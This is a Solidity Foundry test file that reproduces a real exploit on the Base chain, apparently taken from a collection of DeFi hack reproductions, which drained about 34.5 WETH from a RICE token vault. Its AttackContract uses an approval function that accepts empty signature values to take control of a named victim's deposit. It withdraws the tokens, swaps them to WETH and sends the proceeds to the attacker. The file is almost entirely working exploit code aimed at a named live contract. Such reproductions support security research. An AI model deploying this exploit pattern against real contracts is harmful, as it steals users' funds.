// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~ 34.5 WETH ($88.1K)
// Attacker : https://basescan.org/address/0x2a49c6fd18bd111d51c4fffa6559be1d950b8eff
// Attack Contract : https://basescan.org/address/0x7ee23c81995fe7992721ac14b3af522718b63f8f
// Vulnerable Contract : https://basescan.org/address/0xcfe0de4a50c80b434092f87e106dfa40b71a5563
// Attack Tx : https://basescan.org/tx/0x8421c96c1cafa451e025c00706599ef82780bdc0db7d17b6263511a420e0cf20

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0xcfe0de4a50c80b434092f87e106dfa40b71a5563#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/1926461662644633770
// Hacking God : N/A

address constant WETH_ADDR = 0x4200000000000000000000000000000000000006;
address constant USDC_ADDR = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
address constant USDT_ADDR = 0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2;
address constant RICE_TOKEN = 0xf501E4c51dBd89B95de24b9D53778Ff97934cd9c;
address constant SWAP_ROUTER = 0xBE6D8f0d05cC4be24d5167a3eF062215bE6D18a5;
address constant UNISWAP_V3_ROUTER = 0x2626664c2603336E57B271c5C0b26F421741e481;

contract RICE_exp is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 30_655_996 - 1;

    function setUp() public {
        vm.createSelectFork("base", blocknumToForkFrom);
        // Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = WETH_ADDR;

        vm.label(WETH_ADDR, "WETH");
        vm.label(USDC_ADDR, "USDC");
        vm.label(USDT_ADDR, "USDT");
        vm.label(RICE_TOKEN, "RICE");
        vm.label(SWAP_ROUTER, "SwapRouter");
        vm.label(UNISWAP_V3_ROUTER, "Uniswap V3: Swap Router02");
    }

    function testExploit() public balanceLog {
        AttackContract attackContract = new AttackContract();
        attackContract.start();
    }

    receive() external payable {
        // Handle the received funds
    }
}

contract AttackContract {
    address attacker;

    constructor() {
        attacker = msg.sender;
    }

    function start() public {
        IERC20(USDT_ADDR).allowance(address(this), SWAP_ROUTER);
        IERC20(USDT_ADDR).approve(SWAP_ROUTER, type(uint256).max);
        IERC20(RICE_TOKEN).allowance(address(this), UNISWAP_V3_ROUTER);
        IERC20(RICE_TOKEN).approve(UNISWAP_V3_ROUTER, type(uint256).max);

        address unverified = 0xcfE0DE4A50C80B434092f87e106DFA40b71A5563;
        I0xcfE0(unverified).registerProtocol();
        address user = 0x49876a20bB86714e98A7E4d0a33d85a4011b3455;
        I0xcfE0(unverified).setMasterContractApproval(user, address(this), true, 0, bytes32(0), bytes32(0));
        uint256 balance = 22_189_176_505_973_791_717_313_474;
        I0xcfE0(unverified).withdraw(RICE_TOKEN, user, address(this), balance, balance);

        TokenHelper.approveToken(RICE_TOKEN, UNISWAP_V3_ROUTER, type(uint256).max);
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
            tokenIn: RICE_TOKEN,
            tokenOut: USDT_ADDR,
            fee: 3000,
            recipient: address(this),
            amountIn: balance,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        ISwapRouter(UNISWAP_V3_ROUTER).exactInputSingle(params);

        TokenHelper.approveToken(USDT_ADDR, SWAP_ROUTER, type(uint256).max);

        ISwapRouter.ExactInputParams memory params2 = ISwapRouter.ExactInputParams({
            path: hex"fde4c96c8593536e31f229ea8f37b2ada2699bb2000001833589fcd6edb6e08f4c7c32d4f71b54bda029130000644200000000000000000000000000000000000006",
            recipient: address(this),
            deadline: block.timestamp + 1000,
            amountIn: 88_232_917_196,
            amountOutMinimum: 0
        });
        ISwapRouter(SWAP_ROUTER).exactInput(params2);

        uint256 finalBalance = TokenHelper.getTokenBalance(WETH_ADDR, address(this));
        TokenHelper.transferToken(WETH_ADDR, attacker, finalBalance);
    }

    receive() external payable {
        // Handle the received funds
    }
}

interface I0xcfE0 {
    function registerProtocol() external;
    function setMasterContractApproval(
        address user,
        address masterContract,
        bool approved,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
    function withdraw(address token_, address from, address to, uint256 amount, uint256 share) external;
}

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);

    function exactInput(ExactInputParams memory params) external payable returns (uint256 amountOut);
}
